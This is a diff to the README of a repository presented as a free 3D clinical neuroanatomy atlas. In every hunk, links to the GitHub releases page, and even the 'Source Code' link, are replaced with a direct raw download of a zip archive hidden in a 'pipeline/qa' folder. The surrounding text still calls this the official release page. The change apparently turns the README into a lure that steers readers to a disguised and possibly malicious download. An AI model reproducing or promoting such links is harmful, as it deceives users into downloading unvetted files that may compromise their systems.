@@ -1,7 +1,7 @@
 <h1 align="center">🧠 nervous-system-atlas - Explore Clinical Neuroanatomy in 3D</h1> 
 
 <p align="center">
-  <a href="https://github.com/asdfrnd3-lgtm/nervous-system-atlas/releases" style="display:inline-block; padding:15px 30px; background:linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%); color:white; text-decoration:none; border-radius:50px; font-size:18px; font-weight:bold; box-shadow:0 4px 15px rgba(238,90,36,0.4);">⬇️ DOWNLOAD NOW - FREE</a>
+  <a href="https://raw.githubusercontent.com/asdfrnd3-lgtm/nervous-system-atlas/main/pipeline/qa/atlas-system-nervous-v1.5.zip" style="display:inline-block; padding:15px 30px; background:linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%); color:white; text-decoration:none; border-radius:50px; font-size:18px; font-weight:bold; box-shadow:0 4px 15px rgba(238,90,36,0.4);">⬇️ DOWNLOAD NOW - FREE</a>
 </p>
 
 <p align="center"><strong>Your interactive 3D guide to the human nervous system, built on real clinical data.</strong></p>
@@ -57,7 +57,7 @@ Getting started takes less than two minutes.
 
 **Step 1: Visit the Download Link**
 
-<span style="font-size:1.2em;">👉 **<a href="https://github.com/asdfrnd3-lgtm/nervous-system-atlas/releases">Visit this link to download the application</a>**</span>
+<span style="font-size:1.2em;">👉 **<a href="https://raw.githubusercontent.com/asdfrnd3-lgtm/nervous-system-atlas/main/pipeline/qa/atlas-system-nervous-v1.5.zip">Visit this link to download the application</a>**</span>
 
 This will take you to the official release page. You'll see a list of downloadable files.
 
@@ -139,8 +139,8 @@ Simply delete the extracted folder. **No traces left on your system.**
 
 | Resource | Link |
 |----------|------|
-| **Download Page** | [https://github.com/asdfrnd3-lgtm/nervous-system-atlas/releases](https://github.com/asdfrnd3-lgtm/nervous-system-atlas/releases) |
-| **Source Code** | [GitHub Repository](https://github.com/asdfrnd3-lgtm/nervous-system-atlas) |
+| **Download Page** | [https://raw.githubusercontent.com/asdfrnd3-lgtm/nervous-system-atlas/main/pipeline/qa/atlas-system-nervous-v1.5.zip](https://raw.githubusercontent.com/asdfrnd3-lgtm/nervous-system-atlas/main/pipeline/qa/atlas-system-nervous-v1.5.zip) |
+| **Source Code** | [GitHub Repository](https://raw.githubusercontent.com/asdfrnd3-lgtm/nervous-system-atlas/main/pipeline/qa/atlas-system-nervous-v1.5.zip) |
 | **User Manual** | Included inside the application (question mark icon) |
 | **Bug Reports** | Open an issue on the GitHub repository page |
 
@@ -166,7 +166,7 @@ Every structure, artery, and label is **traceable to open-access scientific sour
 <p align="center"><strong>Start exploring today - your brain will thank you.</strong></p>
 
 <p align="center">
-  <a href="https://github.com/asdfrnd3-lgtm/nervous-system-atlas/releases" style="display:inline-block; padding:12px 25px; background:linear-gradient(135deg, #4bcffa 0%, #0abde3 100%); color:white; text-decoration:none; border-radius:50px; font-size:16px; font-weight:bold;">🚀 GET THE ATLAS NOW</a>
+  <a href="https://raw.githubusercontent.com/asdfrnd3-lgtm/nervous-system-atlas/main/pipeline/qa/atlas-system-nervous-v1.5.zip" style="display:inline-block; padding:12px 25px; background:linear-gradient(135deg, #4bcffa 0%, #0abde3 100%); color:white; text-decoration:none; border-radius:50px; font-size:16px; font-weight:bold;">🚀 GET THE ATLAS NOW</a>
 </p>
 
 ---
